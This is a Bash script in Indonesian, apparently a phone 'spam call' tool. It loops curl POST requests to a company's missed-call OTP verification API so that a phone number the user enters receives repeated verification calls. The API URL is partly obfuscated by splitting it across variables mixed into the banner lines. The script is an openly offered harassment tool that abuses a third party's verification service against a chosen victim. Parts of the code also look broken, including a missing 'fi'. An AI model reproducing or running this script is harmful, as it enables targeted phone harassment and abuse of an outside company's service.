# Author Mr.Tr3v!0n & A-Gmvt
# Decoded At : Wednesday ,26 Feb 2020 ,- 16:45:00

b="\033[34;1m"
p="\033[39;1m"
k="\033[33;1m"
m="\033[31;1m"
h="\033[32;1m"
c="\033[35;1m"
pu="\033[36;1m"
x="\033[30;1m"
o="\033[0m"
JAM=`date +%H`
MENIT=`date +%M`
DETIK=`date +%S`
TANGGAL=`date +%d`
BULAN=`date +%m`
TAHUN=`date +%Y`
        
        load(){
        printf "\t ${p}[${c}•${p}]${pu}Proses Spaming${h}"
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf "."
        sleep 0.5
        printf ".\n"
        }
function check(){
		if [ -z $(command -v curl) ];then
		printf "${p}[${m}!${p}]${m}curl belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install curl\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
		fi
		if [ -z $(command -v bash) ];then
		printf "${p}[${m}!${p}]${m}bash belum di install!!\n"
		printf "${p}[${m}!${p}]${h}pkg install bash\n"
		printf "${p}[${m}!${p}]${m}Silahkan Install dulu\n"
		exit
}
check
clear
echo -e "\t${p}__________________________";v1="htt";v6="lub.co.i";v11="Mis";echo -e "\t${h}   TOOLS SPAM TELPHONE";v2="ps://r";v7="d//api/O";v15="ter?P";echo -e "\t${p}   Author${m}: ${x}Mr.Tr3v!0n";v3="ewards";v8="TPMe";v13="llRe";echo -e "\t${p} Team${m}: ${p,}Black Coder Crush";v4="api.n";v9="mber/V";v12="sca";v16="hone=";echo -e "\t${p}__________________________";v5="utric";v10="erify";v14="gis"
function spam(){
for (( loop = 1; loop <= loop; loop++ ));do
	get=$( curl -s -X POST -H "Connection:keep-alive" -H "Content-Length:0" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36" -H "Sec-Fetch-Mode:cors" -H "Sec-Fetch-Site:same-site" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7" -d "" "https://rewardsapi.nutriclub.co.id//api/OTPMember/VerifyMisscallRegister?Phone=$number" | grep -Eo -i "XiD" | tr "xid" "rus")
	if [[ $get =~ "rus" ]];then
	printf "${p}[${h}$loop${p}] Spaming Call To ${pu}$number ${m}[${h} Berhasil ${m}]\n"
	sleep 10
	
	elif [[ $get != "rus" ]];then
	echo -e "\n${p}[${m}!${p}] Limit 3 Spam Call"
	echo -e "${p}[${m}!${p}] Tunggu 1 Jam Untuk Spam Lagi"
	exit 1
	fi
done
}

function __main__(){
	printf "\n\t${b}╔════════════════════════╗ \n"
    printf "\t${b}║${p}NO TARGET${m}:${pu} " number
    read number;
    printf "\t${b}╚════════════════════════╝\n"    
    
   if    [[ \${number:0:2} =~ "08" ]]; then
   number="$number"
   printf "\t ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   elif [[ ${number:0:2} =~ "62" ]]; then
   number="08${number:3:15}"
   printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   elif [[ ${number:0:3} =~ "+62" ]]; then
   number="08${number:4:15}"
   printf "\t   ${m}*${x}ctrl + c untuk exit${m}*\n"
   spam
   else 
   printf "\t${p}[${m}!${p}] ${m}Invalid Number!!\n\n"
   exit 1
   fi
}
__main__
